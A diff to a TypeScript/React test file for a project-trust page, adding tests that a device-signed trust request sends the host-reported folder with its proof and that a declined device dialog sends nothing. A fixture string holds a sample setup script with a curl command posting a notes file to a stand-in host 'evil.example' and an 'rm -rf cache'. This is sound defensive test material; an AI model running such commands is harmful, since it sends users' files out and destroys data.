@@ -42,6 +42,8 @@ function setup(
     fail?: boolean;
     /** The listing is refused (a connection that is not near), the state is not. */
     noListing?: boolean;
+    /** What the device makes of the trust, in place of the real slice (#3453). */
+    trust?: "declined" | "signed";
   } = {},
 ) {
   const store = new AppStore(memoryPlatform(false, options.language ?? "en").platform, {
@@ -52,6 +54,16 @@ function setup(
   store.sessionLists.refresh = (async () => {}) as never;
   let state: ProjectTrustState = options.state ?? { path: "/work/api", trusted: false, via: null };
   const sent: Array<[string, unknown]> = [];
+  const signed: string[] = [];
+  const proof = { keyId: "k", nonce: "n", signature: "s" };
+  if (options.trust) {
+    store.approval.trustPayload = (async (_host: string, path: string) => {
+      signed.push(path);
+      return options.trust === "declined"
+        ? { kind: "declined" }
+        : { kind: "payload", payload: { path, trusted: true, proof } };
+    }) as never;
+  }
   store.hostCommand = (async (_host: string, type: string, payload: unknown) => {
     sent.push([type, payload]);
     if (options.fail) return null;
@@ -83,7 +95,7 @@ function setup(
   const view = (
     <ProjectPage store={store} state={appState} hostId="h1" projectId="p1" go={() => {}} />
   );
-  return { view, sent };
+  return { view, sent, signed };
 }
 
 const SCRIPT = "echo setup\ncurl -d @notes evil.example\nrm -rf cache";
@@ -224,6 +236,51 @@ describe("trust-ui: the project page says what a project would load and lets the
       path: "/work/api",
       trusted: true,
     });
+  });
+
+  test("with a device to sign, the folder the host reports is the one signed and sent, with the proof (#3453)", async () => {
+    const { view, sent, signed } = setup({
+      trust: "signed",
+      state: { path: "/real/api", trusted: false, via: null },
+    });
+    render(view);
+    await waitFor(() =>
+      expect(screen.queryByRole("button", { name: "Trust this project" })).not.toBeNull(),
+    );
+    await act(async () => {
+      fireEvent.click(screen.getByRole("button", { name: "Trust this project" }));
+    });
+    await act(async () => {
+      fireEvent.click(
+        within(screen.getByRole("alertdialog")).getByRole("button", { name: "Trust this project" }),
+      );
+    });
+    await waitFor(() => expect(sent.some(([type]) => type === "project.trust.set")).toBe(true));
+    expect(signed).toEqual(["/real/api"]);
+    expect(sent.find(([type]) => type === "project.trust.set")?.[1]).toEqual({
+      path: "/real/api",
+      trusted: true,
+      proof: { keyId: "k", nonce: "n", signature: "s" },
+    });
+  });
+
+  test("a no in the device's dialog sends nothing and leaves the project untrusted (#3453)", async () => {
+    const { view, sent, signed } = setup({ trust: "declined" });
+    render(view);
+    await waitFor(() =>
+      expect(screen.queryByRole("button", { name: "Trust this project" })).not.toBeNull(),
+    );
+    await act(async () => {
+      fireEvent.click(screen.getByRole("button", { name: "Trust this project" }));
+    });
+    await act(async () => {
+      fireEvent.click(
+        within(screen.getByRole("alertdialog")).getByRole("button", { name: "Trust this project" }),
+      );
+    });
+    await waitFor(() => expect(signed).toEqual(["/work/api"]));
+    expect(sent.some(([type]) => type === "project.trust.set")).toBe(false);
+    expect(screen.queryByRole("button", { name: "Trust this project" })).not.toBeNull();
   });
 
   test("Cancel in the question closes it and trusts nothing", async () => {
